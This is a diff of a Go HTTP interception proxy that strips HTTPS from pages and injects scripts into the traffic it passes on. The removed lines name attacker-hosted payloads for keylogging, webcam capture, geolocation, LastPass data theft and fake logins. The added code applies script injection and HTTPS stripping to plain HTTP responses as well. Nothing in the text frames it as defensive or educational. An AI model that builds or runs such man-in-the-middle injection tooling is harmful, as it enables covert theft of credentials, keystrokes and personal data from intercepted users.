@@ -17,12 +17,13 @@ const (
     CONN_TYPE = "tcp" //accept tcp connections
 
     INJECT_LOGGER_REPLACE = "</body>"
-    INJECT_LOGGER_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/keylogger.js\"></script></body>"
-    INJECT_PHOTO_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/takePhoto.js\"></script></body>"
-    INJECT_LOCATION_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/getLocation.js\"></script></body>"
-    INJECT_LASTPASS_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
-    INJECT_LOGIN_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/login.js\"></script></body>"
 )
+var INJECT_LOGGER_RESULT string
+var INJECT_PHOTO_RESULT string
+var INJECT_LOCATION_RESULT string
+var INJECT_LASTPASS_RESULT string
+var INJECT_LOGIN_RESULT string
+
 // Provide booleans for each function
 var globalStoreHAR bool
 var globalRedirects bool
@@ -57,15 +58,16 @@ func StartSimpleProxy() {
 
     //transparency
     proxy.NonProxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
+        log.Println(req.URL.Scheme)
         if req.Host == "" {
             log.Println(w, "Cannot handle requests without Host header, e.g., HTTP 1.0")
             return
         }
-        req.URL.Scheme = "http"
+            req.URL.Scheme = "http"    
+        
         req.URL.Host = req.Host
         proxy.ServeHTTP(w, req)
     })
-
     // Check if we are BLOCKING this page.
     if globalBlocks {
         pageBlock := TriggerBlock()
@@ -135,7 +137,6 @@ func StartSimpleProxy() {
             if err != nil {
                log.Println("inject error: ", err)
             }
-            log.Println("ctx: ", ctx.Resp.Request.URL)
             //process whether to inject scripts
             utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
             body := utilsProcessInjectionScripts(ctx, string(bs))
@@ -219,10 +220,8 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 }
                 body := string(bs)
                 body = strings.Replace(body, "https", "http", -1)
-                if globalInjectKeyLogger {
-                    utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
-                    body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
-                }
+                utilsModifyHeadersForInjection(ctx)
+                body = utilsProcessInjectionScripts(ctx, body)
                 // Create a response object from the body.
                 client_response := utilsGetHTTPHeaders(body,server_ssl_response.Header.Get("Content-Type"))
                 ctx.Resp = client_response
@@ -238,15 +237,33 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 body := string(bs)
                 // strip all https out of the page so that a redirect will be required if necessary
                 body = strings.Replace(body, "https", "http", -1)
-                if globalInjectKeyLogger {
-                    utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
-                    body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
-                }
+                utilsModifyHeadersForInjection(ctx)
+                body = utilsProcessInjectionScripts(ctx, body)
                 ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
                 return goproxy.NEXT
             }
 
-        } // end of 301-302 redirects.
+        } else { // end of 301-302 redirects.
+            //here need to handle HTTP requests.
+            //its just an HTTP page no...?
+            log.Println("Response is just HTTP")
+            bs, err := ioutil.ReadAll(ctx.Resp.Body)
+            if err != nil {
+                log.Println(err)
+            }
+            body := string(bs)
+            // strip all https out of the page so that a redirect will be required if necessary
+            body = strings.Replace(body, "https", "http", -1)
+            utilsModifyHeadersForInjection(ctx)
+            body = utilsProcessInjectionScripts(ctx, body)
+            // if globalInjectKeyLogger {
+            //     log.Println("globalInjectKeyLogger: ", globalInjectKeyLogger)
+            //     utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
+            //     body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
+            // }
+            ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
+            return goproxy.NEXT
+        }
 
         return goproxy.NEXT
     }) // end of the proxy OnResponse.
